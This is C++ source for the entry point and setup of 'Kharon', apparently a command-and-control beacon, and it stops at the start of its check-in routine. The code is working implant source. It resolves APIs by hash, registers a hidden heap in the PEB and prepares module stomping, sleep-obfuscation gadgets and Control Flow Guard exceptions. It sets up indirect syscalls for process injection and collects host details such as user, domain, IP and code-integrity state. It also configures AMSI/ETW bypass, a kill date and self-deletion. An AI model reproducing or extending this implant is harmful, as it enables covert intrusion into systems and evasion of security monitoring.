#include <Kharon.h>

using namespace Root;

inline void* operator new(size_t, void* p) { return p; }
inline void operator delete(void*, void*) noexcept {}  

EXTERN_C DECLFN auto Main(
    _In_ UPTR Argument
) -> VOID {
    //
    // check guardrails
    //

    if ( Guardrails() ) {
        return;
    }

    //
    // put beacon into peb to global usage
    //

    PEB* peb = NtCurrentPeb();

    auto AllocHeap = (PVOID (*)( PVOID, ULONG, SIZE_T ))LdrLoad::_Api( 
        LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) ), 
        Hsh::Str<CHAR>( "RtlAllocateHeap" ) 
    );

    auto RtlCreateHeap = (PVOID(*)(ULONG, PVOID, SIZE_T, SIZE_T, PVOID, PVOID))LdrLoad::_Api(
        LdrLoad::Module(Hsh::Str<CHAR>("ntdll.dll")), 
        Hsh::Str<CHAR>("RtlCreateHeap")
    );
    
    PVOID CustomHeap = RtlCreateHeap(
        HEAP_GROWABLE | HEAP_ZERO_MEMORY,
        nullptr,
        0x100000,  // 1MB
        0,
        nullptr,
        nullptr
    );

    Kharon* Kh = (Kharon*)AllocHeap( CustomHeap, HEAP_ZERO_MEMORY, sizeof( Kharon ) ); new (Kh) Kharon();
    
    if (peb->NumberOfHeaps >= peb->MaximumNumberOfHeaps) {
        ULONG newMax = peb->MaximumNumberOfHeaps * 2;
        
        PVOID* newHeaps = (PVOID*)AllocHeap(
            peb->ProcessHeap, 
            HEAP_ZERO_MEMORY, 
            newMax * sizeof(PVOID)
        );

        Mem::Copy( newHeaps, peb->ProcessHeaps, peb->NumberOfHeaps * sizeof(PVOID) );
        
        peb->ProcessHeaps = newHeaps;
        peb->MaximumNumberOfHeaps = newMax;
    }

    peb->ProcessHeaps[peb->NumberOfHeaps] = Kh;
    peb->NumberOfHeaps++;

    //
    // initialize classes
    //

    Crypt*     KhCrypt   = (Crypt*)    AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Crypt));     new (KhCrypt) Crypt(Kh);
    Spoof*     KhSpoof   = (Spoof*)    AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Spoof));     new (KhSpoof) Spoof(Kh);
    Coff*      KhCoff    = (Coff*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Coff));      new (KhCoff) Coff(Kh);
    Syscall*   KhSyscall = (Syscall*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Syscall));   new (KhSyscall) Syscall(Kh);
    Jobs*      KhJobs    = (Jobs*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Jobs));      new (KhJobs) Jobs(Kh);
    Useful*    KhUseful  = (Useful*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Useful));    new (KhUseful) Useful(Kh);
    Library*   KhLibrary = (Library*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Library));   new (KhLibrary) Library(Kh);
    Token*     KhToken   = (Token*)    AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Token));     new (KhToken) Token(Kh);
    Heap*      KhHeap    = (Heap*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Heap));      new (KhHeap) Heap(Kh);
    Process*   KhProcess = (Process*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Process));   new (KhProcess) Process(Kh);
    Memory*    KhMemory  = (Memory*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Memory));    new (KhMemory) Memory(Kh);
    Thread*    KhThread  = (Thread*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Thread));    new (KhThread) Thread(Kh);
    Task*      KhTask    = (Task*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Task));      new (KhTask) Task(Kh);
    Transport* KhTransport = (Transport*)AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Transport));new (KhTransport) Transport(Kh);
    Package*   KhPackage = (Package*)  AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Package));   new (KhPackage) Package(Kh);
    Parser*    KhParser  = (Parser*)   AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Parser));    new (KhParser) Parser(Kh);
    Mask*      KhMask    = (Mask*)     AllocHeap(CustomHeap, HEAP_ZERO_MEMORY, sizeof(Mask));      new (KhMask) Mask(Kh);

    Kh->InitCrypt( KhCrypt );
    Kh->InitSpoof( KhSpoof );
    Kh->InitCoff( KhCoff );
    Kh->InitMemory( KhMemory );
    Kh->InitSyscall( KhSyscall );
    Kh->InitJobs( KhJobs );
    Kh->InitUseful( KhUseful );
    Kh->InitHeap( KhHeap );
    Kh->InitLibrary( KhLibrary );
    Kh->InitToken( KhToken );
    Kh->InitMask( KhMask );
    Kh->InitProcess( KhProcess );
    Kh->InitTask( KhTask );
    Kh->InitTransport( KhTransport );
    Kh->InitThread( KhThread );
    Kh->InitPackage( KhPackage );
    Kh->InitParser( KhParser );

    //
    // initialize the beacon config
    //

    Kh->Init();

    //
    // execute the principal routine
    //

    Kh->Start( Argument );

    return;
}

DECLFN Kharon::Kharon( VOID ) {
    if ( this->Session.Base.Start ) return;

    //
    // get in memory beacon information
    //

    this->Session.Base.Start  = StartPtr();
    this->Session.Base.Length = ( EndPtr() - this->Session.Base.Start );

    //
    // initialize the core modules
    //

    this->Krnl32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "kernel32.dll" ) );
    this->KrnlBase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "kernelbase.dll" ) );
    this->Ntdll.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) );

    RSL_IMP( Ntdll  );
    RSL_IMP( Krnl32 );
    RSL_IMP( KrnlBase );
}

auto DECLFN Kharon::Init(
    VOID
) -> void {
    //
    // get config from compilation
    //

    KHARON_CONFIG Cfg = { 0 };

    GetConfig( &Cfg );

    this->Session.AgentID = Cfg.AgentId;
    this->Config          = Cfg;

    //
    // try resolve modules if loadeds
    //

    this->Advapi32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "advapi32.dll" ) );
    this->Wininet.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "wininet.dll" ) );
    this->Cryptbase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "cryptbase.dll" ) );
    this->Ws2_32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
    this->Msvcrt.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "msvcrt.dll" ) );
    this->Iphlpapi.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "iphlpapi.dll" ) );

    //
    // if not loaded, load modules
    //

    if ( ! this->Advapi32.Handle  ) this->Advapi32.Handle  = this->Lib->Load( "advapi32.dll"  );
    if ( ! this->Wininet.Handle   ) this->Wininet.Handle   = this->Lib->Load( "wininet.dll"   );
    if ( ! this->Cryptbase.Handle ) this->Cryptbase.Handle = this->Lib->Load( "cryptbase.dll" );
    if ( ! this->Ws2_32.Handle    ) this->Ws2_32.Handle    = this->Lib->Load( "ws2_32.dll"    );
    if ( ! this->Msvcrt.Handle    ) this->Msvcrt.Handle    = this->Lib->Load( "msvcrt.dll"    );
    if ( ! this->Iphlpapi.Handle  ) this->Iphlpapi.Handle  = this->Lib->Load( "iphlpapi.dll"  );

    RSL_IMP( Msvcrt    );
    RSL_IMP( Advapi32  );
    RSL_IMP( Wininet   );
    RSL_IMP( Cryptbase );
    RSL_IMP( Ws2_32    );
    RSL_IMP( Iphlpapi  );

    //
    // resolve some functions
    //

    this->Ntdll._RtlFillMemory = ( decltype( this->Ntdll._RtlFillMemory ) )LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str<CHAR>( "RtlFillMemory" ) );
    this->Ntdll._RtlCopyMemory = ( decltype( this->Ntdll._RtlCopyMemory ) )LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str<CHAR>( "RtlCopyMemory" ) );
    this->Krnl32.InitializeProcThreadAttributeList = ( decltype( this->Krnl32.InitializeProcThreadAttributeList ) )this->Krnl32.GetProcAddress( (HMODULE)this->Krnl32.Handle, "InitializeProcThreadAttributeList" );
    this->Krnl32.UpdateProcThreadAttribute         = ( decltype( this->Krnl32.UpdateProcThreadAttribute ) )this->Krnl32.GetProcAddress( (HMODULE)this->Krnl32.Handle, "UpdateProcThreadAttribute" );
    this->Krnl32.DeleteProcThreadAttributeList     = ( decltype( this->Krnl32.DeleteProcThreadAttributeList ) )this->Krnl32.GetProcAddress( (HMODULE)this->Krnl32.Handle, "DeleteProcThreadAttributeList" );
    this->Msvcrt.k_swprintf  = ( decltype( this->Msvcrt.k_swprintf ) )this->Krnl32.GetProcAddress( (HMODULE)this->Msvcrt.Handle, "swprintf" );
    this->Msvcrt.k_vscwprintf = ( decltype( this->Msvcrt.k_vscwprintf ) )this->Krnl32.GetProcAddress( (HMODULE)this->Msvcrt.Handle, "_vscwprintf" );
    this->Msvcrt.k_vswprintf = ( decltype( this->Msvcrt.k_vswprintf ) )this->Krnl32.GetProcAddress( (HMODULE)this->Msvcrt.Handle, "_vsnwprintf" );

    KhDbgz( "Library kernel32.dll  Loaded at %p and Functions Resolveds", this->Krnl32.Handle    );
    KhDbgz( "Library ntdll.dll     Loaded at %p and Functions Resolveds", this->Ntdll.Handle     );
    KhDbgz( "Library advapi32.dll  Loaded at %p and Functions Resolveds", this->Advapi32.Handle  );
    KhDbgz( "Library wininet.dll   Loaded at %p and Functions Resolveds", this->Wininet.Handle   );
    KhDbgz( "Library cryptbase.dll Loaded at %p and Functions Resolveds", this->Cryptbase.Handle );
    KhDbgz( "Library ws2_32.dll    Loaded at %p and Functions Resolveds", this->Ws2_32.Handle    );
    KhDbgz( "Library msvcrt.dll    Loaded at %p and Functions Resolveds", this->Msvcrt.Handle    );
    KhDbgz( "Library iphlpapi.dll  Loaded at %p and Functions Resolveds", this->Iphlpapi.Handle  );

    //
    // setup sleep obf gadgets
    //

    this->Config.Mask.NtContinueGadget = ( LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str( "LdrInitializeThunk" ) ) + 19 );
    this->Config.Mask.JmpGadget        = this->Usf->FindGadget( this->Ntdll.Handle, this->Config.Mask.JmpRegGadget );

    if ( ! this->Config.Mask.NtContinueGadget ) {
        KhDbgz("dont was possible found the NtContinue gadget, using NtContinue address\n");
        this->Config.Mask.NtContinueGadget = (UPTR)this->Ntdll.NtContinue;
    }

    //
    // get memory location that beacon is located
    //

    MEMORY_BASIC_INFORMATION BeaconMemory = {};

if ( this->Krnl32.VirtualQuery( (PVOID)this->Session.Base.Start, &BeaconMemory, sizeof(BeaconMemory) ) ) {
        this->Session.MemoryType = BeaconMemory.Type;

        if ( this->Session.MemoryType == MEM_IMAGE ) {
            this->Session.Stomp.TextSize  = BeaconMemory.RegionSize;
            this->Session.Stomp.Base      = BeaconMemory.AllocationBase;
            this->Session.Stomp.TextStart = BeaconMemory.BaseAddress;
            this->Session.Stomp.DllHandle = (HMODULE) BeaconMemory.AllocationBase;

            this->Session.Stomp.DllNamew = (PWCHAR)this->Hp->Alloc( MAX_PATH * sizeof(WCHAR) );

            if ( this->Krnl32.GetModuleFileNameW( (HMODULE) BeaconMemory.AllocationBase, this->Session.Stomp.DllNamew, MAX_PATH ) ) {
                this->Session.Stomp.DllPathw = (PWCHAR)this->Usf->ModulePath( Hsh::Str<WCHAR>( this->Session.Stomp.DllNamew ) );

                ULONG PathLenA = Str::LengthW( this->Session.Stomp.DllPathw ) + 1;
                this->Session.Stomp.DllPathc = (CHAR*) this->Hp->Alloc( PathLenA );
                if ( this->Session.Stomp.DllPathc ) {
                    Str::WCharToChar( this->Session.Stomp.DllPathc, this->Session.Stomp.DllPathw, PathLenA );
                }

                HANDLE DllFile = this->Krnl32.CreateFileW(
                    this->Session.Stomp.DllPathw, GENERIC_READ, FILE_SHARE_READ,
                    nullptr, OPEN_EXISTING, 0, nullptr
                );

                if ( DllFile && DllFile != INVALID_HANDLE_VALUE ) {

                    HANDLE  DllSection = nullptr;
                    NTSTATUS NtStatus  = this->Mm->CreateSection(
                        &DllSection, SECTION_MAP_READ, nullptr, nullptr,
                        PAGE_READONLY, SEC_IMAGE, DllFile
                    );

                    if ( NT_SUCCESS( NtStatus ) && DllSection ) {

                        PVOID  DllMap   = nullptr;
                        SIZE_T ViewSize = 0;
                        NtStatus = this->Mm->MapView(
                            DllSection, NtCurrentProcess(), &DllMap, 0, 0,
                            nullptr, &ViewSize, ViewUnmap, 0, PAGE_READONLY
                        );

                        if ( NT_SUCCESS( NtStatus ) && DllMap ) {

                            PIMAGE_DOS_HEADER Dos = C_PTR_AS( PIMAGE_DOS_HEADER, DllMap );
                            if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {

                                PIMAGE_NT_HEADERS Nt = C_PTR_AS( PIMAGE_NT_HEADERS, U_PTR( DllMap ) + Dos->e_lfanew );
                                if ( Nt->Signature == IMAGE_NT_SIGNATURE ) {

                                    this->Session.Stomp.FullSize = Nt->OptionalHeader.SizeOfImage;

                                    PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION( Nt );
                                    for ( WORD i = 0; i < Nt->FileHeader.NumberOfSections; i++ ) {
                                        if ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {

                                            PVOID CleanText = (PVOID)( U_PTR( DllMap ) + Section[i].VirtualAddress );
                                            ULONG CleanSize = Section[i].Misc.VirtualSize;

                                            this->Session.Stomp.DllBackup = this->Hp->Alloc( CleanSize );
                                            if ( this->Session.Stomp.DllBackup ) {
                                                Mem::Copy( this->Session.Stomp.DllBackup, CleanText, CleanSize );
                                                KhDbgz( "stomp init: backed up clean .text [0x%X bytes] from disk mapping at %p",
                                                    CleanSize, CleanText );
                                            }

                                            break;
                                        }
                                    }
                                }
                            }

                            this->Mm->UnmapView( NtCurrentProcess(), DllMap );
                        }

                        this->Ntdll.NtClose( DllSection );
                    }

                    this->Ntdll.NtClose( DllFile );
                }
            }

            KhDbgz( "stomp init: base=%p text=%p size=0x%X path=%ls",
                this->Session.Stomp.Base, this->Session.Stomp.TextStart,
                this->Session.Stomp.TextSize, this->Session.Stomp.DllPathw );
        }
    }

    //
    // handle cfg exceptions to sleep obf if enabled
    //

    if ( this->Machine.CfgEnabled = this->Usf->CfgCheck() ) {
        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle,     (PVOID)this->Config.Mask.JmpGadget );
        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle,     (PVOID)this->Ntdll.NtSetContextThread );
        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle,     (PVOID)this->Ntdll.NtGetContextThread );
        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle,     (PVOID)this->Ntdll.NtWaitForSingleObject );
        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle,    (PVOID)this->Krnl32.WaitForSingleObjectEx );
        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle,    (PVOID)this->Krnl32.VirtualProtect );
        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle,    (PVOID)this->Krnl32.SetEvent );
        this->Usf->CfgAddrAdd( (PVOID)this->Cryptbase.Handle, (PVOID)this->Cryptbase.SystemFunction040 );
        this->Usf->CfgAddrAdd( (PVOID)this->Cryptbase.Handle, (PVOID)this->Cryptbase.SystemFunction041 );
    }

    //
    // setup syscall informatio to do indirect calls
    //

    this->Sys->Ext[Sys::Alloc].Address          = U_PTR( this->Ntdll.NtAllocateVirtualMemory );
    this->Sys->Ext[Sys::Write].Address          = U_PTR( this->Ntdll.NtWriteVirtualMemory );
    this->Sys->Ext[Sys::OpenProc].Address       = U_PTR( this->Ntdll.NtOpenProcess );
    this->Sys->Ext[Sys::OpenTd].Address         = U_PTR( this->Ntdll.NtOpenThread );
    this->Sys->Ext[Sys::QueueApc].Address       = U_PTR( this->Ntdll.NtQueueApcThread );
    this->Sys->Ext[Sys::Protect].Address        = U_PTR( this->Ntdll.NtProtectVirtualMemory );
    this->Sys->Ext[Sys::CreateTd].Address       = U_PTR( this->Ntdll.NtCreateThreadEx );
    this->Sys->Ext[Sys::CreateSection].Address  = U_PTR( this->Ntdll.NtCreateSection );
    this->Sys->Ext[Sys::MapView].Address        = U_PTR( this->Ntdll.NtMapViewOfSection );
    this->Sys->Ext[Sys::Read].Address           = U_PTR( this->Ntdll.NtReadVirtualMemory );
    this->Sys->Ext[Sys::Free].Address           = U_PTR( this->Ntdll.NtFreeVirtualMemory );
    this->Sys->Ext[Sys::GetCtxThread].Address   = U_PTR( this->Ntdll.NtGetContextThread );
    this->Sys->Ext[Sys::SetCtxThread].Address   = U_PTR( this->Ntdll.NtSetContextThread );
    this->Sys->Ext[Sys::OpenPrToken].Address    = U_PTR( this->Ntdll.NtOpenThreadTokenEx );
    this->Sys->Ext[Sys::OpenThToken].Address    = U_PTR( this->Ntdll.NtOpenProcessTokenEx );
    
    for ( INT i = 0; i < Sys::Last; i++ ) {
        this->Sys->Fetch( i );
    }

    //
    // generate key to encryption
    //

    for ( INT i = 0; i < sizeof( this->Crp->LokKey ); i++ ) {
        this->Crp->LokKey[i] = (BYTE)Rnd32();
    }

    for (int i = 0; i < sizeof(this->Crp->XorKey); i++) {
        this->Crp->XorKey[i] = this->Crp->LokKey[sizeof(this->Crp->LokKey) - 1 - i];
    }

    
    //
    // collect machine informations
    //

    CHAR   cProcessorName[MAX_PATH] = { 0 };

    BOOL   IsWow64      = FALSE;
    ULONG  TmpVal       = 0;
    ULONG  TokenInfoLen = 0;
    HANDLE TokenHandle  = nullptr;
    BOOL   Success      = FALSE;
    HKEY   KeyHandle    = nullptr;

    ULONG  ProcBufferSize    = sizeof( cProcessorName );
    PCHAR  cProcessorNameReg = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";

    SYSTEM_INFO     SysInfo   = { 0 };
    MEMORYSTATUSEX  MemInfoEx = { 0 };
    TOKEN_ELEVATION Elevation = { 0 };

    PROCESS_EXTENDED_BASIC_INFORMATION PsBasicInfoEx = { 0 };

    MemInfoEx.dwLength = sizeof( MEMORYSTATUSEX );

    this->Machine.OsMjrV  = NtCurrentPeb()->OSMajorVersion;
    this->Machine.OsMnrV  = NtCurrentPeb()->OSMinorVersion;
    this->Machine.OsBuild = NtCurrentPeb()->OSBuildNumber;

    this->Ntdll.NtQueryInformationProcess( 
        NtCurrentProcess(), ProcessBasicInformation, 
        &PsBasicInfoEx, sizeof( PsBasicInfoEx ), nullptr 
    );

    this->Krnl32.GlobalMemoryStatusEx( &MemInfoEx );
    this->Krnl32.GetNativeSystemInfo( &SysInfo );

    this->Machine.AllocGran = SysInfo.dwAllocationGranularity;
    this->Machine.PageSize  = SysInfo.dwPageSize;

    this->Krnl32.IsWow64Process( NtCurrentProcess(), &IsWow64 );

    if ( IsWow64 ) {
        this->Session.ProcessArch = 0x86;
    } else {
        this->Session.ProcessArch = 0x64;
    }

	if ( 
		SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || 
		SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64
	) {
		this->Machine.OsArch = 0x64;
	} else {
		this->Machine.OsArch = 0x86;
	}

    this->Machine.ProcessorsNbr = SysInfo.dwNumberOfProcessors;

    this->Session.ProcessID = HandleToUlong( NtCurrentTeb()->ClientId.UniqueProcess );
    this->Session.ThreadID  = HandleToUlong( NtCurrentTeb()->ClientId.UniqueThread );
    this->Session.ParentID  = HandleToUlong( PsBasicInfoEx.BasicInfo.InheritedFromUniqueProcessId );

    this->Session.ImagePath   = A_PTR( this->Hp->Alloc( MAX_PATH ) );
    this->Session.CommandLine = A_PTR( this->Hp->Alloc( MAX_PATH ) );

    Str::WCharToChar( this->Session.ImagePath, PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer ) + 1 );
    Str::WCharToChar( this->Session.CommandLine, PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer ) + 1 );

    Success = this->Advapi32.OpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &TokenHandle );
    Success = this->Advapi32.GetTokenInformation( TokenHandle, TokenElevation, &Elevation, sizeof( Elevation ), &TokenInfoLen );

    this->Machine.TotalRAM   = ( MemInfoEx.ullTotalPhys / ( 1024*1024 ) );
    this->Machine.AvalRAM    = ( MemInfoEx.ullAvailPhys / ( 1024*1024 ) );
    this->Machine.UsedRAM    = ( ( MemInfoEx.ullTotalPhys / ( 1024*1024 ) ) - ( MemInfoEx.ullAvailPhys / ( 1024*1024 ) ) );;
    this->Machine.PercentRAM = MemInfoEx.dwMemoryLoad;

    this->Session.Elevated = Elevation.TokenIsElevated;

    Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, nullptr, &TmpVal );
    if ( ! Success ) {
        this->Machine.CompName = (PCHAR)this->Hp->Alloc( TmpVal );
        this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, this->Machine.CompName, &TmpVal );
    }

    Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsDomain, nullptr, &TmpVal );
    if ( ! Success ) {
        this->Machine.DomName = (PCHAR)this->Hp->Alloc( TmpVal );
        this->Krnl32.GetComputerNameExA( ComputerNameDnsDomain, this->Machine.DomName, &TmpVal );
    }

    Success = this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, nullptr, &TmpVal );
    if ( ! Success ) {
        this->Machine.NetBios = (PCHAR)this->Hp->Alloc( TmpVal );
        this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, A_PTR( this->Machine.NetBios ), &TmpVal );
    }

    IN_ADDR          IpObject   = { 0 };
    ULONG            AdapterLen = 0;
    PVOID            Terminator = nullptr;
    IP_ADAPTER_INFO* Adapter    = { nullptr };

    this->Iphlpapi.GetAdaptersInfo( nullptr, &AdapterLen );
    Adapter = (IP_ADAPTER_INFO*)this->Hp->Alloc( AdapterLen );
    if ( Adapter ) {
        if ( this->Iphlpapi.GetAdaptersInfo( Adapter, &AdapterLen ) == NO_ERROR ) {
            IP_ADAPTER_INFO* CurrentAdapter = Adapter;

            while ( CurrentAdapter ) {
                if ( CurrentAdapter->IpAddressList.IpAddress.String[0] != '\0' ) {
                    if ( this->Ntdll.RtlIpv4StringToAddressA( CurrentAdapter->IpAddressList.IpAddress.String, FALSE, (PCHAR*)&Terminator, &IpObject ) == STATUS_SUCCESS ) {
                        this->Machine.IpAddress = IpObject.S_un.S_addr;
                        break;
                    }
                }

                CurrentAdapter = CurrentAdapter->Next;
            }
        }

        this->Hp->Free( Adapter );
    }

    TmpVal = 0;
    if ( !this->Advapi32.GetUserNameA( nullptr, &TmpVal ) && KhGetError == ERROR_INSUFFICIENT_BUFFER ) {
        this->Machine.UserName = (PCHAR)this->Hp->Alloc( TmpVal );
        if ( !this->Advapi32.GetUserNameA( this->Machine.UserName, &TmpVal ) ) {
            this->Hp->Free( this->Machine.UserName );
            this->Machine.UserName = nullptr;
        }
    }
    
    this->Advapi32.RegOpenKeyExA( 
        HKEY_LOCAL_MACHINE, cProcessorNameReg,
        0, KEY_READ, &KeyHandle
    );

    this->Advapi32.RegQueryValueExA(
        KeyHandle, "ProcessorNameString", nullptr, nullptr,
        B_PTR( cProcessorName ), &ProcBufferSize
    );

    this->Machine.ProcessorName = (PCHAR)this->Hp->Alloc( ProcBufferSize );
    Mem::Copy( this->Machine.ProcessorName, cProcessorName, ProcBufferSize );

    KhDbgz( "======== Session Informations ========" );
    KhDbgz( "Agent UUID: %s", this->Session.AgentID );
    KhDbgz( "Image Path: %s", this->Session.ImagePath );
    KhDbgz( "Command Line: %s", this->Session.CommandLine );
    KhDbgz( "Process ID: %d", this->Session.ProcessID );
    KhDbgz( "Parent ID: %d", this->Session.ParentID );
    KhDbgz( "Sleep Time: %d", this->Config.SleepTime );
    KhDbgz( "Jitter Time: %d\n", this->Config.Jitter );

    KhDbgz( "Encryption Key[16] = "
        "[0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] [0x%X] \n", 
        this->Crp->LokKey[0],  this->Crp->LokKey[1],  this->Crp->LokKey[2],  this->Crp->LokKey[0], 
        this->Crp->LokKey[3],  this->Crp->LokKey[4],  this->Crp->LokKey[5],  this->Crp->LokKey[0], 
        this->Crp->LokKey[6],  this->Crp->LokKey[7],  this->Crp->LokKey[8],  this->Crp->LokKey[0], 
        this->Crp->LokKey[9],  this->Crp->LokKey[10], this->Crp->LokKey[11], this->Crp->LokKey[12], 
        this->Crp->LokKey[13], this->Crp->LokKey[14], this->Crp->LokKey[15]
    );

    KhDbgz( "======== Machine Informations ========" );
    KhDbgz( "User Name: %s", this->Machine.UserName );
    KhDbgz( "Computer Name: %s", this->Machine.CompName );
    KhDbgz( "Domain Name: %s", this->Machine.DomName );
    KhDbgz( "NETBIOS: %s", this->Machine.NetBios );
    KhDbgz( "Processor Name: %s", this->Machine.ProcessorName );
    KhDbgz( "Total RAM: %d", this->Machine.TotalRAM );
    KhDbgz( "Aval RAM: %d", this->Machine.AvalRAM );
    KhDbgz( "Used RAM: %d", this->Machine.UsedRAM );
    KhDbgz( "Win Version: %d.%d.%d", this->Machine.OsMjrV, this->Machine.OsMnrV, this->Machine.OsBuild);
    
    SYSTEM_CODEINTEGRITY_INFORMATION CodeIntegrityInfo = { 0 };
    CodeIntegrityInfo.Length = sizeof(CodeIntegrityInfo);

    if ( NT_SUCCESS( this->Ntdll.NtQuerySystemInformation( 
        SystemCodeIntegrityInformation, &CodeIntegrityInfo, sizeof(CodeIntegrityInfo), nullptr ) ) 
    ) {
        this->Machine.HvciEnabled = (CodeIntegrityInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED) != 0;
        this->Machine.DseEnabled = (CodeIntegrityInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_ENABLED) != 0 && (CodeIntegrityInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN) == 0;
        this->Machine.TestSigningEnabled = (CodeIntegrityInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN) != 0;
        this->Machine.DebugModeEnabled = (CodeIntegrityInfo.CodeIntegrityOptions & CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED) != 0;
    }

    SYSTEM_SECUREBOOT_INFORMATION SecureBootInfo = { 0 };

    if ( NT_SUCCESS( this->Ntdll.NtQuerySystemInformation( 
        SystemSecureBootInformation, &SecureBootInfo, sizeof(SecureBootInfo), nullptr ) ) 
    ) {
        this->Machine.SecureBootEnabled = SecureBootInfo.SecureBootEnabled;
    }
        
    KhDbgz( "HVCI Enabled: %s", this->Machine.HvciEnabled ? "Yes" : "No" );
    KhDbgz( "DSE Enabled: %s\n", this->Machine.DseEnabled ? "Yes" : "No" );

    KhDbgz( "======== Transport Informations ========" );
    KhDbgz("profile c2: %X", PROFILE_C2);

    KhDbgz("======== Evasion Settings ========");
    KhDbgz("Bypass      : %s", 
        this->Config.Evasion.AmsiEtwBypass == 0x00 ? "None" :
        this->Config.Evasion.AmsiEtwBypass == 0x03 ? "All"  :
        this->Config.Evasion.AmsiEtwBypass == 0x02 ? "AMSI" :
        this->Config.Evasion.AmsiEtwBypass == 0x01 ? "ETW"  : "Unknown"
    );
    KhDbgz("BOF Proxy  : %s", this->Config.Evasion.BofProxy  ? "Enabled" : "Disabled");
    KhDbgz("Mask Heap  : %s", this->Config.Mask.Heap        ? "Enabled" : "Disabled");
    KhDbgz("Mask Beacon: %s", 
        this->Config.Mask.Beacon == eMask::Timer ? "Timer" : 
        this->Config.Mask.Beacon == eMask::None  ? "None"  : "Unknown"
    );
    KhDbgz("Syscall: %s", 
        this->Config.Evasion.Syscall == SYSCALL_SPOOF_INDIRECT ? "Spoof + Indirect" :
        this->Config.Evasion.Syscall == SYSCALL_SPOOF          ? "Spoof"            :
        this->Config.Evasion.Syscall == SYSCALL_NONE           ? "None"             : "Unknown"
    );
    KhDbgz("Spawnto: %S\n", this->Config.Postex.Spawnto);

    KhDbgz("======== Guardrails Settings ========");
    KhDbgz("User   Name: %s", this->Config.Guardrails.UserName);
    KhDbgz("Host   Name: %s", this->Config.Guardrails.HostName);
    KhDbgz("Domain Name: %s", this->Config.Guardrails.DomainName);
    KhDbgz("IpAddress: %s\n", this->Config.Guardrails.IpAddress);

    KhDbgz("======== WorkTime Settings ========");
    KhDbgz("WorkTime Check: %s", this->Config.Worktime.Enabled ? "Enabled" : "Disabled");
    KhDbgz("WorkTime Start: %d:%d", this->Config.Worktime.StartHour, this->Config.Worktime.StartMin);
    KhDbgz("WorkTime End  : %d:%d\n,", this->Config.Worktime.EndHour, this->Config.Worktime.EndMin);

    KhDbgz("======== Killdate Settings ========");
    KhDbgz("Killdate Check: %s", this->Config.KillDate.Enabled ? "Enabled" : "Disabled");
    KhDbgz("Killdate Date : %d/%d/%d", this->Config.KillDate.Month, this->Config.KillDate.Day, this->Config.KillDate.Year);
    KhDbgz("Killdate Exit : %s", this->Config.KillDate.ExitProc ? "Process" : "Thread");
    KhDbgz("Killdate Self Delete: %s\n", this->Config.KillDate.SelfDelete ? "Enabled" : "Disabled");

    KhDbgz( "Collected informations and setup agent\n" );

    return;
}

auto DECLFN Kharon::Start( 
    _In_ UPTR Argument 
) -> VOID {
    KhDbgz( "Initializing the principal routine" );

    //
    // do checkin routine (request + validate connection)
    //
